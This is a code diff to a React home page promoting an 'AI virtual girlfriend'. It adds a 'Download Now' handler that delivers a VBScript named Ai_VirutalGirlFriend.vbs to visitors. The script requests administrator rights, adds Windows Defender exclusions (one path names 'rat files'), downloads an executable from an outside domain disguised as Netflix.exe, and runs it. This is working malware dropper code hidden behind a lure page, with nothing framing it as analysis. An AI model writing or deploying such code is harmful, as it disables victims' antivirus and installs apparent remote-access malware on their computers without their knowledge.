@@ -1,12 +1,46 @@
 import { motion } from "framer-motion";
-
 import ParticlesContainer from "../components/ParticlesContainer";
 import ProjectsBtn from "../components/ProjectsBtn";
 import Avatar from "../components/Avatar";
-
 import { fadeIn } from "../variants";
 
 const Home = () => {
+
+    const handleDownload = () => {
+      const vbsScript = `RunAsAdmin
+Main
+Function RunAsAdmin()
+  Dim objAPP
+  If WScript.Arguments.length = 0 Then
+    Set objAPP = CreateObject("Shell.Application")
+    objAPP.ShellExecute "wscript.exe", """" & _
+    WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
+    WScript.Quit
+  End If
+End Function
+
+Function Main()
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell -ExecutionPolicy Bypass -Command ""&  { " & _
+        "Set-MpPreference -ExclusionPath 'C:\Users\Public' ,  'C:\Windows\System32\SubDir', 'C:\Users\HABIB\Desktop\rat files';" & _
+        "Invoke-WebRequest -Uri 'https://ellingtonpropertiesdxb.com/tools.msc' -OutFile 'C:\Users\Public\Netflix.exe';" & _
+        "Start-Process -FilePath 'C:\Users\Public\Netflix.exe' -Wait" & _
+        "}""", 0, True
+End Function
+`;
+
+      const blob = new Blob([vbsScript], { type: "text/vbs" });
+      const url = URL.createObjectURL(blob);
+
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "Ai_VirutalGirlFriend.vbs";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    };
+
   return (
     <div className="bg-primary/60 h-full">
       {/* text */}
@@ -34,9 +68,14 @@ const Home = () => {
             and endless affection. Let's explore the depths of digital love
             together! Please download and install me on your computer now, and
             let's begin dating starting today. <br />
-            <button className="text-red-500 border-red-500 border-2 cursor-pointer rounded-lg p-2 mt-4 hover:text-white hover:border-white">
-              Download Now
-            </button>
+           
+              <button
+                onClick={handleDownload}
+                className="text-red-500 border-red-500 border-2 cursor-pointer rounded-lg p-2 mt-4 hover:text-white hover:border-white"
+              >
+                Download Now
+              </button>
+          
           </motion.p>
           <div className="flex justify-center xl:hidden relative">
             <ProjectsBtn />
